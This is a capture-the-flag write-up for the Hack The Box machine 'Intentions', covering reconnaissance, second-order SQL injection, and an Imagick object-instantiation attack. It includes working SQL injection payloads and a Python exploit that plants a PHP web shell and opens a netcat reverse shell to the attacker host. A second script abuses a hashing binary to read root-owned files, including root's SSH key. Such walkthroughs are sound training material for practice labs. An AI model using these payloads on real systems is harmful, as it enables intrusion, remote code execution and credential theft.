---
title: 'HTB Intentions - Hard'
date: 2024-05-09 00:00:00 +0000
categories: [HTB Machines]
tags: [Hard, Linux, HTB]
---
**Intentions** is a hard HTB machine that provides a **great opportunity to practice scripting**. The user flag is tough; you will need to identify and exploit a **second-order SQL injection** with some tampering to dump the credentials from the database. Then, we can login as administrators due to an **exposed file disclosing critical information** and achieve RCE by abusing an **Imagick’s PHP instantiation exploit**. The root flag is not that hard but still very funny.

<img src="/assets/img/intentions/Untitled.png" alt="Untitled.png" style="width:600px;">

# Reconnaissance

Started with an Nmap scan with [nmap4lazy](https://github.com/duskb1t/nmap4lazy), a simple script I created.

```bash
sudo python3 ~/Desktop/tools/nmap4lazy/nmap4lazy.py -t 10.129.229.27

[+] Scanning all TCP ports...

[+] Command being used:

/usr/bin/nmap 10.129.229.27 -p- -sS -Pn -n --min-rate 5000

[+] Open ports: 

22, 80

[+] NSE Scan in process. This might take a while...

[+] Command being used:

/usr/bin/nmap 10.129.229.27 -sVC -p22,80

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-08 23:28 WEST
Nmap scan report for 10.129.229.27
Host is up (0.061s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 47:d2:00:66:27:5e:e6:9c:80:89:03:b5:8f:9e:60:e5 (ECDSA)
|_  256 c8:d0:ac:8d:29:9b:87:40:5f:1b:b0:a4:1d:53:8f:f1 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Intentions
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.68 seconds

[+] Script finished successfully
```

We can create a new account in the web service and log in.

<img src="/assets/img/intentions/Untitled 1.png" alt="Untitled 1.png" style="width:800px;">

This is what we find after logging in.

<img src="/assets/img/intentions/Untitled 2.png" alt="Untitled 2.png" style="width:800px;">

Apparently, the only modifiable field is the ‘Favorite Genres’ from the profile tab.

<img src="/assets/img/intentions/Untitled 3.png" alt="Untitled 3.png" style="width:800px;">

I tried using a different genre from the gallery.

<img src="/assets/img/intentions/Untitled 4.png" alt="Untitled 4.png" style="width:800px;">

Our feed varies based on the genres that we have set as favorites.

<img src="/assets/img/intentions/Untitled 5.png" alt="Untitled 5.png" style="width:800px;">

When TCP/80 seems to be the only accessible port I like running [Feroxbuster](https://github.com/epi052/feroxbuster).

```
feroxbuster --collect-extensions --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt -u "http://10.129.229.27" -C 404
200      GET        2l     2249w   153684c http://10.129.229.27/js/mdb.js
200      GET        2l     5429w   279176c http://10.129.229.27/js/login.js
200      GET       63l     3842w   411821c http://10.129.229.27/css/app.css
200      GET       39l       94w     1523c http://10.129.229.27/
302      GET       12l       22w      326c http://10.129.229.27/admin => http://10.129.229.27
301      GET        7l       12w      178c http://10.129.229.27/css => http://10.129.229.27/css/
200      GET        0l        0w        0c http://10.129.229.27/favicon.ico
301      GET        7l       12w      178c http://10.129.229.27/fonts => http://10.129.229.27/fonts/
302      GET       12l       22w      326c http://10.129.229.27/gallery => http://10.129.229.27
200      GET       39l       94w     1523c http://10.129.229.27/index.php
301      GET        7l       12w      178c http://10.129.229.27/js => http://10.129.229.27/js/
302      GET       12l       22w      326c http://10.129.229.27/logout => http://10.129.229.27
200      GET        2l     6382w   311246c http://10.129.229.27/js/admin.js
200      GET        2l     7687w   433792c http://10.129.229.27/js/app.js
200      GET        2l        3w       24c http://10.129.229.27/robots.txt
301      GET        7l       12w      178c http://10.129.229.27/storage => http://10.129.229.27/storage/
200      GET        2l     6188w   310841c http://10.129.229.27/js/gallery.js
301      GET        7l       12w      178c http://10.129.229.27/storage/architecture => http://10.129.229.27/storage/architecture/
301      GET        7l       12w      178c http://10.129.229.27/storage/food => http://10.129.229.27/storage/food/
301      GET        7l       12w      178c http://10.129.229.27/fonts/vendor => http://10.129.229.27/fonts/vendor/
[####################] - 9m    233875/233875  0s      found:20      errors:0      
[####################] - 3m     22218/22218   122/s   http://10.129.229.27/ 
[####################] - 33s    14095/14095   425/s   http://10.129.229.27/.git/logs/ 
[####################] - 54s     5960/5960    111/s   http://10.129.229.27/.git/logs/cgi-bin/ 
[####################] - 5m     11201/11201   39/s    http://10.129.229.27/css/ 
[####################] - 68s     6939/6939    102/s   http://10.129.229.27/css/.git/logs/ 
[####################] - 5m     12057/12057   38/s    http://10.129.229.27/fonts/ 
[####################] - 88s     9024/9024    102/s   http://10.129.229.27/fonts/.git/logs/ 
[####################] - 6m     12986/12986   38/s    http://10.129.229.27/js/ 
[####################] - 2m     11637/11637   103/s   http://10.129.229.27/js/.git/logs/ 
[####################] - 6m     14184/14184   39/s    http://10.129.229.27/storage/ 
[####################] - 2m     14184/14184   105/s   http://10.129.229.27/storage/.git/logs/ 
[####################] - 6m     14184/14184   42/s    http://10.129.229.27/storage/architecture/ 
[####################] - 5m     14184/14184   50/s    http://10.129.229.27/storage/food/ 
[####################] - 4m     14184/14184   56/s    http://10.129.229.27/fonts/vendor/
```

The .git directory returns 403 forbidden so it is not possible to use [git-dumper](https://github.com/arthaud/git-dumper) on it. However, there is an admin.js file that **contains critical information**.

```
wget http://10.129.229.27/js/admin.js

cat admin.js | grep -i pass
Hey team, I've deployed the v2 API to production and have started using it in the admin section.
Let me know if you spot any bugs.

This will be a major security upgrade for our users, passwords no longer need to be transmitted to the server in clear text!
By hashing the password client side there is no risk to our users as BCrypt is basically uncrackable.

This should take care of the concerns raised by our users regarding our lack of HTTPS connection.
The v2 API also comes with some neat features we are testing that could allow users to apply cool effects to the images. I've included some examples on the image editing page
```

# Exploitation

If we send a single quote with Burp Suite in the genres’ field, the server responds with a 200 OK.

<img src="/assets/img/intentions/Untitled 6.png" alt="Untitled 6.png" style="width:800px;">

Visiting our feed shows a 500 Internal Server Error. We have found that the query is most likely vulnerable to a **second-order SQL injection**.

<img src="/assets/img/intentions/Untitled 7.png" alt="Untitled 7.png" style="width:800px;">

Using the following query results in a 200 OK.

```bash
{"genres":"food')/**/order/**/by/**/5#"}
```

<img src="/assets/img/intentions/Untitled 8.png" alt="Untitled 8.png" style="width:800px;">

But increasing the columns by 1 returns a 500 status code. We have successfully identified the number of columns that the SQL query has (5). 

```bash
{"genres":"food')/**/order/**/by/**/6#"}
```

<img src="/assets/img/intentions/Untitled 9.png" alt="Untitled 9.png" style="width:800px;">

It may be possible to exfiltrate data from the database in one of those fields.

```bash
{"genres":"food')/**/union/**/select/**/1,2,3,4,5#"}
```

<img src="/assets/img/intentions/Untitled 10.png" alt="Untitled 10.png" style="width:800px;">

There is a non-default database called ‘intentions’.

```bash
{"genres":"food')/**/union/**/select/**/1,2,schema_name,4,5/**/from/**/information_schema.schemata#"}
```

<img src="/assets/img/intentions/Untitled 11.png" alt="Untitled 11.png" style="width:800px;">

Identified a ‘users’ table that could contain valid credentials.

```bash
{"genres":"food')/**/union/**/select/**/1,2,table_name,4,5/**/from/**/information_schema.tables/**/where/**/table_schema='intentions'#"}
```

<img src="/assets/img/intentions/Untitled 12.png" alt="Untitled 12.png" style="width:800px;">

Dumped all column names from the ‘users’ table.

```bash
{"genres":"food')/**/union/**/select/**/1,2,group_concat(column_name),4,5/**/from/**/information_schema.columns/**/where/**/table_schema='intentions'/**/and/**/table_name='users'#"}
```

<img src="/assets/img/intentions/Untitled 13.png" alt="Untitled 13.png" style="width:800px;">

Yes sir! We successfully dumped the ‘users’ table!

```bash
{"genres":"food')/**/union/**/select/**/1,2,group_concat(name,':',email,':',password,':',admin),4,5/**/from/**/intentions.users#"}
```

<img src="/assets/img/intentions/Untitled 14.png" alt="Untitled 14.png" style="width:800px;">

Formatted the output to differentiate between administrative and non-administrative users, as cracking bcrypt hashes is out of the equation.

```bash
cat intentions.users | tr "," "\n" | grep 1$ > admin.list

cat admin.list                                               
steve:steve@intentions.htb:$2y$10$M\/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa:1
greg:greg@intentions.htb:$2y$10$95OR7nHSkYuFUUxsT1KS6uoQ93aufmrpknz4jwRqzIbsUpRiiyU5m:1
```

For learning’s sake I tried to exploit this SQL injection with sqlmap but this is as far as I could get. If you know what is wrong please DM me in LinkedIn XD.

```bash
sqlmap -u "http://10.129.229.27/api/v1/gallery/user/genres" --headers "Content-Type: application/json" --data '{"genres":"*"}' --second-url="http://10.129.229.27/api/v1/gallery/user/feed" --dump --technique=U -D intentions --columns 5 --prefix="food')" --suffix="#" --tamper=space2comment.py --level 5 --risk 3 --batch
```

During the initial enumeration phase we discovered an admin.js file that mentioned something about a v2 API that handled hashes instead of passwords. I wonder what’s the point of that…

Logging out and in sends a request to /api/v1/auth/login.

<img src="/assets/img/intentions/Untitled 15.png" alt="Untitled 15.png" style="width:800px;">

Dropping that request and sending a new one to /api/v2/auth/login with an empty body returns an error message indicating that the email and hash fields are mandatory.

<img src="/assets/img/intentions/Untitled 16.png" alt="Untitled 16.png" style="width:800px;">

We can try to log in with Steve’s credentials. It returned a 200 OK.

```bash
{
"email":"steve@intentions.htb",
"hash":"$2y$10$M\/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa"
}
```

<img src="/assets/img/intentions/Untitled 17.png" alt="Untitled 17.png" style="width:800px;">

Used Cookie Editor to insert the cookie into our browser.

<img src="/assets/img/intentions/Untitled 18.png" alt="Untitled 18.png" style="width:800px;">

Now it is possible to access the /admin endpoint.

<img src="/assets/img/intentions/Untitled 19.png" alt="Untitled 19.png" style="width:800px;">

The body text of the news is the same one as the file we disclosed earlier.

<img src="/assets/img/intentions/Untitled 20.png" alt="Untitled 20.png" style="width:800px;">

Following the provided link redirects us to Imagick’s source code.

<img src="/assets/img/intentions/Untitled 21.png" alt="Untitled 21.png" style="width:800px;">

At this point,  [IppSec’s walkthrough](https://www.youtube.com/watch?v=YmRDV0JR4qg&t=3105s&ab_channel=IppSec) was extremely helpful for me because I didn’t find many documentation. It resulted to be a PHP Instantiation exploit with Imagick to achieve RCE.

[This post](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) provides a final payload that we will be using. Personally, I prefer understanding the attack at a high-level and building my own Python script rather than delving into its complexity.

```python
import argparse
import requests
import sys
import textwrap

def rev_shell(target, lhost, lport):
    try:
        command = f'rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20{lhost}%20{lport}%20%3E%2Ftmp%2Ff'
        url = f'http://{target}/duskpayload.php?cmd={command}'

        requests.get(url, timeout=3)

    except requests.Timeout:
        print("\n[+] Check your Netcat listener! :)")

def exploit(target):
    headers = {
    'Host': f'{target}',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'X-Requested-With': 'XMLHttpRequest',
    'Content-Type': 'multipart/form-data; boundary=ABC',
    'Cookie': 'token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTI5LjIyOS4yNy9hcGkvdjIvYXV0aC9sb2dpbiIsImlhdCI6MTcxNTIxNTU0MiwiZXhwIjoxNzE1MjM3MTQyLCJuYmYiOjE3MTUyMTU1NDIsImp0aSI6IndaaTA5RktPYUxQVVg3VVMiLCJzdWIiOiIxIiwicHJ2IjoiMjNiZDVjODk0OWY2MDBhZGIzOWU3MDFjNDAwODcyZGI3YTU5NzZmNyJ9.Ly0Uh0rlvVDIDY_RLQfK-saF1kPxR9PlDcFpy9J6U-c'
    }

    data = textwrap.dedent("""\
    --ABC
    Content-Disposition: form-data; name="swarm"; filename="swarm.msl"
    Content-Type: text/plain

    <?xml version="1.0" encoding="UTF-8"?>
    <image>
    <read filename="caption:&lt;?php @system(@$_REQUEST['cmd']); ?&gt;" />
    <!-- Relative paths such as info:./../../uploads/swarm.php can be used as well -->
    <write filename="info:/var/www/html/intentions/public/duskpayload.php" />
    </image>
    --ABC--""")

    url=f'http://{target}/api/v2/admin/image/modify?effect=swirl&path=vid:msl:/tmp/php*'

    response = requests.post(url, headers=headers, data=data)

    if response.status_code == 502:
        print("\n[+] Webshell has been successfully uploaded at /duskpayload.php")

def set_arguments():
    parser = argparse.ArgumentParser(
        description="HTB Intentions exploit"
    )
    parser.add_argument('-t', '--target', dest='target', required=True)
    parser.add_argument('--lhost', dest='lhost', required=True)
    parser.add_argument('--lport', type=int, default=4444)
    return parser.parse_args()

def main():
    try:
        args = set_arguments()
        exploit(args.target)
        rev_shell(args.target, args.lhost, args.lport)
        sys.exit(0)
    
    except KeyboardInterrupt:
        print("\n[!] Keyboard interrumpt detected. Quitting!")
        sys.exit(1)

main()
```

Executed the script with the required arguments.

```bash
python3 intentions.py -t 10.129.229.27 --lhost 10.10.14.112

[+] Webshell has been successfully uploaded at /duskpayload.php

[+] Check your Netcat listener! :)
```

And we got a shell as www-data!

```bash
nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.112] from (UNKNOWN) [10.129.229.27] 36764

$ whoami
www-data

$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Transformed it into a pseudo interactive TTY and found three more users.

```bash
www-data@intentions:~/html/intentions/public$ ls -l /home
drwxr-x--- 4 greg   greg   4096 Jun 19  2023 greg
drwxr-x--- 4 legal  legal  4096 Jun 19  2023 legal
drwxr-x--- 4 steven steven 4096 Jun 19  2023 steven
```

# Lateral Movement

I remembered from Feroxbuster’s output that there is a .git directory located in the web root. Compressed the .git directory and placed it in the web root to subsequently download it.

```bash
www-data@intentions:~/html/intentions/public$ find / -name .git 2>/dev/null
/var/www/html/intentions/.git

tar -zcvf /tmp/git.tar.gz .git/
mv /tmp/git.tar.gz /var/www/html/intentions/public/
```

The file was huge (over 50 MB) so don’t scream out with the output. **Inspecting logs** led us to discover greg’s clear-text password.

```
wget http://10.129.229.27/git.tar.gz; tar -zxvf git.tar.gz; cd .git; git log -c > output

cat output | grep -i pass
['email' => 'greg@intentions.htb', 'password' => '<REDACTED>']
```

With his password we can connect over SSH and read the user flag. 

```
ssh greg@10.129.229.27

$ bash
greg@intentions:~$ whoami
greg

greg@intentions:~$ id
uid=1001(greg) gid=1001(greg) groups=1001(greg),1003(scanner)

greg@intentions:~$ cat user.txt 
0189a053469f7973****************
```

# PrivEsc

There are two other files in our home directory: a script and a collection of hashes.

```
greg@intentions:~$ ls -l
total 20
-rwxr-x--- 1 root greg    75 Jun 10  2023 dmca_check.sh
-rwxr----- 1 root greg 11044 Jun 10  2023 dmca_hashes.test
-rw-r----- 1 root greg    33 May  9 12:46 user.txt

greg@intentions:~$ ./dmca_check.sh
[+] DMCA-#1952 matches /home/legal/uploads/zac-porter-p_yotEbRA0A-unsplash.jpg

greg@intentions:~$ cat dmca_hashes.test
DMCA-#5133:218a61dfdebf15292a94c8efdd95ee3c
DMCA-#4034:a5eff6a2f4a3368707af82d3d8f665dc
DMCA-#7873:7b2ad34b92b4e1cb73365fe76302e6bd
...
```

Enumerating the script reveals that it is using a binary located at /opt/scanner/scanner.

```
greg@intentions:~$ cat dmca_check.sh
/opt/scanner/scanner -d /home/legal/uploads -h /home/greg/dmca_hashes.test
```

This binary is owned by root but we have read and execute permissions as a member of the scanner’s group.

```
greg@intentions:~$ ls -l /opt/scanner/scanner
-rwxr-x--- 1 root scanner 1437696 Jun 19  2023 /opt/scanner/scanner

greg@intentions:~$ id
uid=1001(greg) gid=1001(greg) groups=1001(greg),1003(scanner)
```

Apparently, this binary hashes a file or a directory and compares it to the MD5 hashes we provide.

```
greg@intentions:~$ /opt/scanner/scanner
The copyright_scanner application provides the capability to evaluate a single file or directory of files against a known blacklist and return matches.

        This utility has been developed to help identify copyrighted material that have previously been submitted on the platform.
        This tool can also be used to check for duplicate images to avoid having multiple of the same photos in the gallery.
        File matching are evaluated by comparing an MD5 hash of the file contents or a portion of the file contents against those submitted in the hash file.

        The hash blacklist file should be maintained as a single LABEL:MD5 per line.
        Please avoid using extra colons in the label as that is not currently supported.

        Expected output:
        1. Empty if no matches found
        2. A line for every match, example:
                [+] {LABEL} matches {FILE}

  -c string
        Path to image file to check. Cannot be combined with -d
  -d string
        Path to image directory to check. Cannot be combined with -c
  -h string
        Path to colon separated hash file. Not compatible with -p
  -l int
        Maximum bytes of files being checked to hash. Files smaller than this value will be fully hashed. Smaller values are much faster but prone to false positives. (default 500)
  -p    [Debug] Print calculated file hash. Only compatible with -c
  -s string
        Specific hash to check against. Not compatible with -h
```

Even if the file matches or not, the returning status code is 0. However, we could try to exfiltrate the content of files owned by root based on the output of the command.

```
greg@intentions:~$ echo -n 'dusk' > test.txt
greg@intentions:~$ echo -n 'dusk' | md5sum
fc8358bcf09e4b3947d1975622a9df14  -
greg@intentions:~$ echo $?
0

greg@intentions:~$ /opt/scanner/scanner -s fc8358bcf09e4b3947d1975622a9df14 -c test.txt -l 4
[+] fc8358bcf09e4b3947d1975622a9df14 matches test.txt
greg@intentions:~$ /opt/scanner/scanner -s asdfghjkl -c test.txt -l 4
greg@intentions:~$ echo $?
0
```

This is the Python script I created. TBH, I don’t think that the ThreadPoolExecutor improved anything the way I implemented it. I always like trying to remake the script with threading once it works.

```python
import argparse
import hashlib
import shlex
import subprocess
import sys
import string
import time
from concurrent.futures import ThreadPoolExecutor

final_string = ""

def comparison(hash, file, c):
    global final_string
    hash = hashlib.md5(f'{final_string}{c}'.encode('utf-8'))
    command = f'/opt/scanner/scanner -s {hash.hexdigest()} -c {file} -l {len(final_string) + 1}'
    process = subprocess.check_output(shlex.split(command))
    if process:
        final_string += c
        print(c, end="")
        return True
    return False

def exploit(file):
    characters = string.ascii_letters + string.digits + string.punctuation + "+ \n"

    print(f"\n[+] Dumping {file}\n")
    while True:
        with ThreadPoolExecutor(max_workers=50) as executor:
            for c in characters:
                process = executor.submit(comparison, hash, file, c)
                if process.result():
                    break

            else:
                return

def set_arguments():
    parser = argparse.ArgumentParser(
        description="HTB Intentions - Scanner exploit"
    )
    parser.add_argument('-f', '--file', dest='file', required=True, choices=['/root/root.txt', '/root/.ssh/id_rsa'])
    return parser.parse_args()

def main():
    try:
        start_time = time.time()
        args = set_arguments()
        exploit(args.file)
        end_time = time.time()
        print("\n[+] Script finished successfully")
        print(f"\n[+] Total time: {round(end_time - start_time, 2)} s\n")
        sys.exit(0)

    except KeyboardInterrupt:
        print("\n\n[!] Keyboard interrumpt detected. Quitting!")
        sys.exit(1)

main()
```

It is possible to read the root flag.

```bash
greg@intentions:~$ python3 scanner_exploit.py -f /root/root.txt

[+] Dumping /root/root.txt

fca42e38631ecfab****************

[+] Script finished successfully

[+] Total time: 1.59 s
```

Or the root SSH private key.

```bash
greg@intentions:~$ python3 scanner_exploit.py -f /root/.ssh/id_rsa

[+] Dumping /root/.ssh/id_rsa

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEA5yMuiPaWPr6P0GYiUi5EnqD8QOM9B7gm2lTHwlA7FMw95/wy8JW3
HqEMYrWSNpX2HqbvxnhOBCW/uwKMbFb4LPI+EzR6eHr5vG438EoeGmLFBvhge54WkTvQyd
vk6xqxjypi3PivKnI2Gm+BWzcMi6kHI+NLDUVn7aNthBIg9OyIVwp7LXl3cgUrWM4StvYZ
ZyGpITFR/1KjaCQjLDnshZO7OrM/PLWdyipq2yZtNoB57kvzbPRpXu7ANbM8wV3cyk/OZt
...
-----END OPENSSH PRIVATE KEY-----

[+] Script finished successfully

[+] Total time: 194.81 s
```

<img src="/assets/img/intentions/Untitled 22.png" alt="Untitled 22.png" style="width:800px;">

All that is left is to connect over SSH as root. GGs!

```
chmod 600 id_rsa
ssh -i id_rsa root@10.129.229.27

root@intentions:~# whoami
root

root@intentions:~# id
uid=0(root) gid=0(root) groups=0(root)
```